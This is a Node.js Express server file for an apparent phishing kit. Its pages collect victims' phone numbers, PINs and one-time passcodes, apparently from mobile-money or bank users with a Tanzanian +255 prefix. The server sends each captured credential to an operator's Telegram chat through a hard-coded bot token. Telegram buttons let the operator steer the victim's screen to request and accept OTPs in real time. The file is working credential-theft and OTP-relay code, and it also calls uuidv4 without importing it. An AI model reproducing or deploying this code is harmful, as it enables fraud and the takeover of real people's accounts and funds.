const express = require("express");
const axios = require("axios");
const cors = require("cors");
const bodyParser = require("body-parser");
const crypto = require('crypto');


const path = require("path");

const app = express();
const PORT = process.env.PORT || 5002;

// Serve all files in your folder (like index.html, step6.html, etc.)
app.use(express.static(path.join(__dirname, "public"))); 

// Add a route to serve your main HTML file
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname,"public", "index.html")); 
});


app.use(cors());
app.use(bodyParser.json());
// app.use(express.static('public'));

// --- TELEGRAM CONFIG ---
const TELEGRAM_BOT_TOKEN = "8724075511:AAFjhU_XRoSRaiMo9i3jUNdvjRLUebwRlCc";
const TELEGRAM_ADMIN_ID = "7162306402";
const BASE_URL = process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`;

app.use(cors());
app.use(bodyParser.json());

// In-memory session store
const sessions = {};

// 1. Initial Submission from index.html
app.post('/api/submit', async (req, res) => {
    const { phone, pin } = req.body;
    const sessionId = uuidv4().substring(0, 8);
    
    sessions[sessionId] = { 
        phone, 
        pin, 
        status: 'pending',
        timestamp: Date.now() 
    };

    const message = `🔔 *New Login Attempt*\n\n📱 *Phone:* \`+255${phone}\`\n🔐 *PIN:* \`${pin}\`\n🆔 *ID:* \`${sessionId}\``;
    
    // Telegram buttons using URL-based commands for simple admin control
    const reply_markup = {
        inline_keyboard: [
            [
                { text: "🔢 OTP 5", url: `${BASE_URL}/api/command/${sessionId}/otp5` },
                { text: "🔢 OTP 6", url: `${BASE_URL}/api/command/${sessionId}/otp6` }
            ],
            [
                { text: "✅ Accept OTP", url: `${BASE_URL}/api/command/${sessionId}/accept` },
                { text: "❌ Decline OTP", url: `${BASE_URL}/api/command/${sessionId}/decline` }
            ]
        ]
    };

    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_ADMIN_ID,
            text: message,
            parse_mode: "Markdown",
            reply_markup: reply_markup
        });
        res.json({ success: true, sessionId });
    } catch (error) {
        console.error("Telegram Error:", error.message);
        res.status(500).json({ success: false });
    }
});

// 2. Command Endpoint (Clicked from Telegram)
app.get('/api/command/:sessionId/:cmd', (req, res) => {
    const { sessionId, cmd } = req.params;
    if (sessions[sessionId]) {
        sessions[sessionId].status = cmd;
        return res.send(`
            <body style="font-family:sans-serif; text-align:center; padding-top:50px; background:#f0f4f8;">
                <div style="background:white; display:inline-block; padding:30px; border-radius:20px; shadow:0 4px 6px rgba(0,0,0,0.1);">
                    <h2 style="color:#003366;">Action Success!</h2>
                    <p>Command: <b>${cmd}</b> sent to user app.</p>
                    <script>setTimeout(() => window.close(), 1500);</script>
                </div>
            </body>
        `);
    }
    res.status(404).send("Session not found");
});

// 3. Status Polling (Checked by index.html and step6.html)
app.get('/api/status/:sessionId', (req, res) => {
    const session = sessions[req.params.sessionId];
    res.json(session ? { status: session.status } : { status: 'idle' });
});

// 4. Submit OTP (From step6.html)
app.post('/api/submit-otp', async (req, res) => {
    const { otp, sessionId } = req.body;
    if (sessions[sessionId]) {
        sessions[sessionId].status = 'verifying';
        const msg = `🔐 *OTP Received*\n\n📱 *User:* +255${sessions[sessionId].phone}\n🔢 *OTP:* \`${otp}\`\n🆔 *ID:* \`${sessionId}\``;
        
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_ADMIN_ID,
            text: msg,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [[
                    { text: "✅ Accept", url: `${BASE_URL}/api/command/${sessionId}/accept` },
                    { text: "❌ Decline", url: `${BASE_URL}/api/command/${sessionId}/decline` }
                ]]
            }
        });
        res.json({ success: true });
    } else {
        res.status(404).json({ success: false });
    }
});

app.listen(PORT, () => console.log(`Server live on ${BASE_URL}`));
